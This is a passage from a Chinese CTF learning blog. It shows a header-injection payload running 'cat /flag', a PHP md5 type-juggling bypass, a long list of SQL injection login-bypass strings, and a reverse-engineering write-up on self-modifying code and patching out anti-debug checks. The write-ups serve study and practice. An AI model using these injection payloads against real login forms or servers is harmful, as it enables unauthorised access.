cross-site</span><br><span class="line">Priority: u=0</span><br><span class="line">Te: trailers</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>

<p>发现网站并没有用复杂的技术来获取IP，而是简单地让的浏览器去调用一个第三方IP查询API</p>
<p>如果服务器信任客户端传来的某些HTTP头信息，就可能被欺骗。最常用的头就是 <code>X-Forwarded-For</code> (XFF)。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: node6.anna.nssctf.cn:23286</span><br><span class="line">X-Forwarded-For:&#123;&#123;system(&#x27;cat /flag&#x27;)&#125;&#125;</span><br><span class="line">Content-Length: 417</span><br><span class="line"></span><br><span class="line">ref(APA): piter.piterの小窝.https://npiter.tech. Retrieved 2025/9/21.</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:143.0) Gecko/20100101 Firefox/143.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Priority: u=0, i</span><br></pre></td></tr></table></figure>



<h3 id="babyphp"><a href="#babyphp" class="headerlink" title="babyphp"></a>babyphp</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include_once(&#x27;flag.php&#x27;);</span><br><span class="line">if(isset($_POST[&#x27;a&#x27;])&amp;&amp;!preg_match(&#x27;/[0-9]/&#x27;,$_POST[&#x27;a&#x27;])&amp;&amp;intval($_POST[&#x27;a&#x27;]))&#123;</span><br><span class="line">    if(isset($_POST[&#x27;b1&#x27;])&amp;&amp;$_POST[&#x27;b2&#x27;])&#123;</span><br><span class="line">        if($_POST[&#x27;b1&#x27;]!=$_POST[&#x27;b2&#x27;]&amp;&amp;md5($_POST[&#x27;b1&#x27;])===md5($_POST[&#x27;b2&#x27;]))&#123;</span><br><span class="line">            if($_POST[&#x27;c1&#x27;]!=$_POST[&#x27;c2&#x27;]&amp;&amp;is_string($_POST[&#x27;c1&#x27;])&amp;&amp;is_string($_POST[&#x27;c2&#x27;])&amp;&amp;md5($_POST[&#x27;c1&#x27;])==md5($_POST[&#x27;c2&#x27;]))&#123;</span><br><span class="line">                echo $flag;</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                echo &quot;yee&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &quot;nop&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &quot;go on&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;let&#x27;s get some php&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt; let&#x27;s get some php</span><br></pre></td></tr></table></figure>

<p>hackbar send post payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a[]=a&amp;b1[]=1&amp;b2[]=2&amp;c1=s878926199a&amp;c2=s155964671a</span><br></pre></td></tr></table></figure>









<h2 id="SQL之万能秘钥学习"><a href="#SQL之万能秘钥学习" class="headerlink" title="SQL之万能秘钥学习"></a>SQL之万能秘钥学习</h2><p>正常的SQL语句</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE username = &#x27;输入的用户名&#x27; AND password = &#x27;输入的密码&#x27;;</span><br></pre></td></tr></table></figure>

<p>用户输入 <code>admin</code> 和 <code>123456</code>，生成的SQL语句为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE username = &#x27;admin&#x27; AND password = &#x27;123456&#x27;;</span><br></pre></td></tr></table></figure>

<p>当我们输入     ‘ OR ‘1’&#x3D;’1</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE username = &#x27;随便输入什么都行&#x27; AND password = &#x27;&#x27; OR &#x27;1&#x27;=&#x27;1&#x27;;</span><br></pre></td></tr></table></figure>

<p><code>username = &#39;随便输入什么都行&#39;</code> → False</p>
<p><code>password = &#39;123456&#39;</code> → False</p>
<p>(False AND False) OR True   —-&gt;    Ture</p>
<p>搬运<a href="%5B%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81%E4%B8%8ESQL%E6%B3%A8%E5%85%A5-CSDN%E5%8D%9A%E5%AE%A2%5D(https://blog.csdn.net/hxhxhxhxx/article/details/108020010)">佬的blog</a></p>
<p>参考链接<a target="_blank" rel="noopener" href="https://blog.csdn.net/hxhxhxhxx/article/details/108020010">https://blog.csdn.net/hxhxhxhxx/article/details/108020010</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or 1=&#x27;1</span><br><span class="line">&#x27;or&#x27;=&#x27;or&#x27;</span><br><span class="line">admin</span><br><span class="line">admin&#x27;--</span><br><span class="line">admin&#x27; or 4=4--</span><br><span class="line">admin&#x27; or &#x27;1&#x27;=&#x27;1&#x27;--</span><br><span class="line">admin888</span><br><span class="line">&quot;or &quot;a&quot;=&quot;a</span><br><span class="line">admin&#x27; or 2=2#</span><br><span class="line">a&#x27; having 1=1#</span><br><span class="line">a&#x27; having 1=1--</span><br><span class="line">admin&#x27; or &#x27;2&#x27;=&#x27;2</span><br><span class="line">&#x27;)or(&#x27;a&#x27;=&#x27;a</span><br><span class="line">or 4=4--</span><br><span class="line">c</span><br><span class="line">a&#x27;or&#x27; 4=4--</span><br><span class="line">&quot;or 4=4--</span><br><span class="line">&#x27;or&#x27;a&#x27;=&#x27;a</span><br><span class="line">&quot;or&quot;=&quot;a&#x27;=&#x27;a</span><br><span class="line">&#x27;or&#x27;&#x27;=&#x27;</span><br><span class="line">&#x27;or&#x27;=&#x27;or&#x27;</span><br><span class="line">1 or &#x27;1&#x27;=&#x27;1&#x27;=1</span><br><span class="line">1 or &#x27;1&#x27;=&#x27;1&#x27; or 4=4</span><br><span class="line">&#x27;OR 4=4%00</span><br><span class="line">&quot;or 4=4%00</span><br><span class="line">&#x27;xor</span><br><span class="line">admin&#x27; UNION Select 1,1,1 FROM admin Where &#x27;&#x27;=&#x27;</span><br><span class="line">1</span><br><span class="line">-1%cf&#x27; union select 1,1,1 as password,1,1,1 %23</span><br><span class="line">1</span><br><span class="line">17..admin&#x27; or &#x27;a&#x27;=&#x27;a 密码随便</span><br><span class="line">&#x27;or&#x27;=&#x27;or&#x27;</span><br><span class="line">&#x27;or 4=4/*</span><br><span class="line">something</span><br><span class="line">&#x27; OR &#x27;1&#x27;=&#x27;1</span><br><span class="line">1&#x27;or&#x27;1&#x27;=&#x27;1</span><br><span class="line">admin&#x27; OR 4=4/*</span><br><span class="line">1&#x27;or&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>

<p>asp aspx万能密码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">1：”or “a”=”a</span><br><span class="line">2： ‘)or(‘a’=’a</span><br><span class="line">3：or 1=1–</span><br><span class="line">4：’or 1=1–</span><br><span class="line">5：a’or’ 1=1–</span><br><span class="line">6：”or 1=1–</span><br><span class="line">7：’or’a’=’a</span><br><span class="line">8：”or”=”a’=’a</span><br><span class="line">9：’or”=’</span><br><span class="line">10：’or’=’or’</span><br><span class="line">11: 1 or ‘1’=’1’=1</span><br><span class="line">12: 1 or ‘1’=’1’ or 1=1</span><br><span class="line">13: ‘OR 1=1%00</span><br><span class="line">14: “or 1=1%00</span><br><span class="line">15: ‘xor</span><br><span class="line">16: 用户名 ’ UNION Select 1,1,1 FROM admin Where ”=’ （替换表名admin）</span><br><span class="line">密码 1</span><br><span class="line">17…admin’ or ‘a’=’a 密码随便</span><br></pre></td></tr></table></figure>

<p>PHP万能密码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">‘or 1=1/*</span><br><span class="line">User: something</span><br><span class="line">Pass: ’ OR ‘1’=’1</span><br></pre></td></tr></table></figure>

<p>jsp 万能密码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1’or’1’=’1</span><br><span class="line">admin’ OR 1=1/*</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://linkpwn.github.io/2025/07/28/smc/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="linkpwn">
      <meta itemprop="description" content="linkpwn的学习经历">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="网络幻影">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/07/28/smc/" class="post-title-link" itemprop="url">smc</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2025-07-28 19:47:53" itemprop="dateCreated datePublished" datetime="2025-07-28T19:47:53+08:00">2025-07-28</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2025-09-23 21:06:40" itemprop="dateModified" datetime="2025-09-23T21:06:40+08:00">2025-09-23</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/reverse/" itemprop="url" rel="index"><span itemprop="name">reverse</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/reverse/%E6%80%BB%E7%BB%93/" itemprop="url" rel="index"><span itemprop="name">总结</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/reverse/%E6%80%BB%E7%BB%93/smc/" itemprop="url" rel="index"><span itemprop="name">smc</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>wuuu,上次烽火杯的smc没写出来，这次的nepctf的smc也没写出了，所以打算总结一下smc，并且以后碰到smc都往这个blog里面放了。</p>
<p>简述一下原理:</p>
<p>在CTF逆向工程中，<strong>SMC（Self-Modifying Code，自修改代码）</strong> 是一种常见的反分析技术。其核心原理是<strong>程序在运行时动态修改自身的指令代码</strong>，使得静态分析工具（如IDA Pro）无法直接获取完整的可执行逻辑，从而增加逆向难度。</p>
<p>感觉smc根本就不难，动调一下基本都可以解决，但是难在有些反调试等方面感觉只单出smc的没见过。</p>
<p>话不多说直接上例题，我目前写过的smc有：NepCTF的realme，[网鼎杯 2020 青龙组]jocker，[SCTF2019]creakme，和烽火杯的smc</p>
<p>今天一天可能写不完四个，慢慢写吧，就按这个顺序来写。</p>
<h2 id="NepCTF-realme"><a href="#NepCTF-realme" class="headerlink" title="NepCTF realme"></a>NepCTF realme</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main_0</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// [esp+0h] [ebp-104h]</span></span><br><span class="line">  <span class="type">char</span> v5; <span class="comment">// [esp+0h] [ebp-104h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [esp+D0h] [ebp-34h]</span></span><br><span class="line">  <span class="type">char</span> v7[<span class="number">40</span>]; <span class="comment">// [esp+DCh] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  __CheckForDebuggerJustMyCode(&amp;unk_41200F);</span><br><span class="line">  qmemcpy(v7, <span class="string">&quot;PY&quot;</span>, <span class="number">2</span>);</span><br><span class="line">  v7[<span class="number">2</span>] = <span class="number">-94</span>;</span><br><span class="line">  v7[<span class="number">3</span>] = <span class="number">-108</span>;</span><br><span class="line">  v7[<span class="number">4</span>] = <span class="number">46</span>;</span><br><span class="line">  v7[<span class="number">5</span>] = <span class="number">-114</span>;</span><br><span class="line">  v7[<span class="number">6</span>] = <span class="number">92</span>;</span><br><span class="line">  v7[<span class="number">7</span>] = <span class="number">-107</span>;</span><br><span class="line">  v7[<span class="number">8</span>] = <span class="number">121</span>;</span><br><span class="line">  v7[<span class="number">9</span>] = <span class="number">22</span>;</span><br><span class="line">  v7[<span class="number">10</span>] = <span class="number">-27</span>;</span><br><span class="line">  v7[<span class="number">11</span>] = <span class="number">54</span>;</span><br><span class="line">  v7[<span class="number">12</span>] = <span class="number">96</span>;</span><br><span class="line">  v7[<span class="number">13</span>] = <span class="number">-57</span>;</span><br><span class="line">  v7[<span class="number">14</span>] = <span class="number">-24</span>;</span><br><span class="line">  v7[<span class="number">15</span>] = <span class="number">6</span>;</span><br><span class="line">  v7[<span class="number">16</span>] = <span class="number">51</span>;</span><br><span class="line">  v7[<span class="number">17</span>] = <span class="number">120</span>;</span><br><span class="line">  v7[<span class="number">18</span>] = <span class="number">-16</span>;</span><br><span class="line">  v7[<span class="number">19</span>] = <span class="number">-48</span>;</span><br><span class="line">  v7[<span class="number">20</span>] = <span class="number">54</span>;</span><br><span class="line">  v7[<span class="number">21</span>] = <span class="number">-56</span>;</span><br><span class="line">  v7[<span class="number">22</span>] = <span class="number">115</span>;</span><br><span class="line">  v7[<span class="number">23</span>] = <span class="number">27</span>;</span><br><span class="line">  v7[<span class="number">24</span>] = <span class="number">101</span>;</span><br><span class="line">  v7[<span class="number">25</span>] = <span class="number">64</span>;</span><br><span class="line">  v7[<span class="number">26</span>] = <span class="number">-75</span>;</span><br><span class="line">  v7[<span class="number">27</span>] = <span class="number">-44</span>;</span><br><span class="line">  v7[<span class="number">28</span>] = <span class="number">-24</span>;</span><br><span class="line">  v7[<span class="number">29</span>] = <span class="number">-100</span>;</span><br><span class="line">  v7[<span class="number">30</span>] = <span class="number">101</span>;</span><br><span class="line">  v7[<span class="number">31</span>] = <span class="number">-12</span>;</span><br><span class="line">  v7[<span class="number">32</span>] = <span class="number">-70</span>;</span><br><span class="line">  v7[<span class="number">33</span>] = <span class="number">98</span>;</span><br><span class="line">  v7[<span class="number">34</span>] = <span class="number">-48</span>;</span><br><span class="line">  sub_40108C(<span class="string">&quot;Please input the flag:\n&quot;</span>, v4);</span><br><span class="line">  sub_4011C2(<span class="string">&quot;%s&quot;</span>, byte_410158);</span><br><span class="line">  sub_401050(byte_410158, Str);    <span class="comment">//魔改RC4 KSA多了一个^0x66,最后的和秘钥流的异或变成了模取</span></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">0x23</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( byte_410158[i] != v7[i] )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_40108C(<span class="string">&quot;Wrong flag!\n&quot;</span>, v5);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  sub_40108C(<span class="string">&quot;Correct flag!\n&quot;</span>, v5);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个rc4的魔改解出来是个错的，就不详细解释了。</p>
<p>进入正文，反思一下我这里没解出来主要是没找到反调试的地方，因为IDA没把他识别成函数，藏在汇编里面。</p>
<p>要自己去翻汇编代码，给他P重定义一下</p>
<p><img src="/2025/07/28/smc/1.png" alt="1"></p>
<p><img src="/2025/07/28/smc/2.png" alt="2"></p>
<p>只能硬找莫得办法，重定义后Tab</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// write access to const memory has been detected, the output may be wrong!</span></span><br><span class="line"><span class="type">void</span> *<span class="title function_">sub_401500</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  result = (<span class="type">void</span> *)(NtCurrentPeb()-&gt;NtGlobalFlag &amp; <span class="number">0x70</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !result )</span><br><span class="line">  &#123;</span><br><span class="line">    *(&amp;loc_40902A + <span class="number">1</span>) ^= <span class="number">0x65u</span>;</span><br><span class="line">    *((_BYTE *)&amp;loc_40902A + <span class="number">2</span>) ^= <span class="number">0xFAu</span>;</span><br><span class="line">    *(&amp;loc_407080 + <span class="number">2</span>) ^= <span class="number">5u</span>;</span><br><span class="line">    result = &amp;loc_40B077;</span><br><span class="line">    loc_40B077 ^= <span class="number">0x10u</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// write access to const memory has been detected, the output may be wrong!</span></span><br><span class="line"><span class="type">void</span> *__cdecl <span class="title function_">sub_4015C0</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  sub_401023(<span class="string">&quot;%s&quot;</span>, a2);</span><br><span class="line">  <span class="keyword">if</span> ( CloseHandle((HANDLE)<span class="number">0x1234</span>) || GetLastError() != <span class="number">6</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  *(&amp;loc_407080 + <span class="number">1</span>) ^= <span class="number">0xD0u</span>;</span><br><span class="line">  *(&amp;loc_40B104 + <span class="number">2</span>) ^= <span class="number">0xCBu</span>;</span><br><span class="line">  loc_40B078 ^= <span class="number">0x61u</span>;</span><br><span class="line">  result = &amp;loc_40B079;</span><br><span class="line">  loc_40B079 ^= <span class="number">0x5Fu</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>很明显的反调试和smc了</p>
<p>smc没什么好讲的得会动调就全部解决了，这里要解决反调试</p>
<p>第一个反调试我们要把(!result)改成(result)。</p>
<p>第二个反调试我要把CloseHandle((HANDLE)0x1234) || GetLastError() !&#x3D; 6的CloseHandle((HANDLE)0x1234) nop掉,不然动调会报错。</p>
<p>还要把if的条件反过来。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.text:0040153F                 jz      short loc_401543  --&gt; jnz      short loc_401543</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:004015EE                 push    1234h           ; hObject        --&gt;nop</span><br><span class="line">.text:004015F3                 call    ds:__imp_CloseHandle             --&gt;nop</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:00401607                 jnz     short loc_40161D                jnz--&gt;jz</span><br><span class="line">.text:00401609                 mov     esi, esp</span><br><span class="line">.text:0040160B                 call    ds:__imp_GetLastError</span><br><span class="line">.text:00401611                 cmp     esi, esp</span><br><span class="line">.text:00401613                 call    j___RTC_CheckEsp</span><br><span class="line">.text:00401618                 cmp     eax, 6</span><br><span class="line">.text:0040161B                 jz      short loc_401635               jz---&gt;jnz</span><br></pre></td></tr></table></figure>

<p>如果不会改可以上网查一下IDA怎么patch。</p>
<p>改完之后我们就可以看到真实的加密逻辑了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *__cdecl <span class="title function_">sub_40B000</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2, <span class="type">unsigned</span> <span class="type">int</span> a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// [esp+D3h] [ebp-129h]</span></span><br><span class="line">  <span class="type">char</span> v5[<span class="number">264</span>]; <span class="comment">// [esp+DCh] [ebp-120h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [esp+1E4h] [ebp-18h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+1F0h] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  result = <span class="built_in">memset</span>(v5, <span class="number">0</span>, <span class="number">0x100u</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">256</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_BYTE *)(i + a1) = i ^ <span class="number">0xCF</span>;</span><br><span class="line">    v5[i] = *(_BYTE *)(a2 + i % a3);</span><br><span class="line">    result = (<span class="type">void</span> *)(i + <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">256</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = ((<span class="type">unsigned</span> __int8)v5[i] + v6 + *(<span class="type">unsigned</span> __int8 *)(i + a1)) % <span class="number">256</span>;</span><br><span class="line">    v4 = *(_BYTE *)(i + a1);</span><br><span class="line">    *(_BYTE *)(i + a1) = *(_BYTE *)(v6 + a1);</span><br><span class="line">    *(_BYTE *)(v6 + a1) = v4 ^ <span class="number">0xAD</span>;</span><br><span class="line">    result = (<span class="type">void</span> *)(i + <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> __cdecl <span class="title function_">sub_401A60</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2, <span class="type">unsigned</span> <span class="type">int</span> a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">char</span> v5; <span class="comment">// al</span></span><br><span class="line">  <span class="type">char</span> v6; <span class="comment">// [esp+D3h] [ebp-35h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [esp+DCh] [ebp-2Ch]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [esp+F4h] [ebp-14h]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [esp+100h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  __CheckForDebuggerJustMyCode(&amp;unk_41200F);</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = i;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= a3 )</span><br><span class="line">      <span 